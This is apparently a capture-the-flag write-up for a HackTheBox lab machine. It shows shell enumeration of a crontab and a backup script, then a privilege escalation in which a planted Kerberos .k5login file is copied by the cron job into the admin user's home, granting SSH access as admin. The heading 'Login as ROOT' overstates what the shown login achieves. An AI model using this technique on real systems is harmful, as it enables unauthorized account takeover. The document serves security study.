# Enumeration-
```bash
[j.nakazawa@srv01 home]$ ls -la
total 0
drwxr-xr-x.  4 root       root        37 Nov  3  2020 .
dr-xr-xr-x. 17 root       root       245 Dec 24  2020 ..
drwxr-x---.  3 admin      admin      168 Jun 26 23:54 admin
drwxr-x---.  2 j.nakazawa j.nakazawa 129 Jun 26 23:43 j.nakazawa
[j.nakazawa@srv01 home]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh
```

The script is owned by root with the admin group:

```bash
[j.nakazawa@srv01 home]$  ls -l /usr/local/bin/log_backup.sh
-rwxr-xr--. 1 root admin 229 Dec  9  2020 /usr/local/bin/log_backup.sh
```

j.nakazawa can read the script:

```bash
[j.nakazawa@srv01 home]$ cat /usr/local/bin/log_backup.sh 
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

This script is using `rsync` to copy all the files from `/var/log/squid/` to `/home/admin/`, then create an archive using `tar`, and clean up.

### Abuse Kerberos-

An interesting feature of Kerberos on Linux is the `.k5login` file. This file in a user’s homedir lists different Kerberos principals (basically users) that can authenticate with their tickets to get access as the user. This is kind of like the `authorized_keys` file for Kerberos. So if admin had a `.k5login` file in their homedir with the name j.nakazawa in it, then anyone with a Kerberos ticket for j.nakazawa could SSH as admin.

I can put that `.k5login` file in place abusing the backup script if I can write to `/var/log/squid`. It looks like only admin and members of the squid group can write:

```bash
[j.nakazawa@srv01 home]$ ls -ld /var/log/squid/
drwx-wx---. 2 admin squid 41 Dec 24  2020 /var/log/squid/
[j.nakazawa@srv01 home]$ id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users)
```

I’ll write a simple `.k5login` file:

```bash
[j.nakazawa@srv01 home]$ echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login
```


### Login as ROOT-

```bash
root@napster:~/Documents/HTB/Tentacle# ssh admin@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Sun Jun 27 00:05:01 2021
[admin@srv01 ~]$ 

```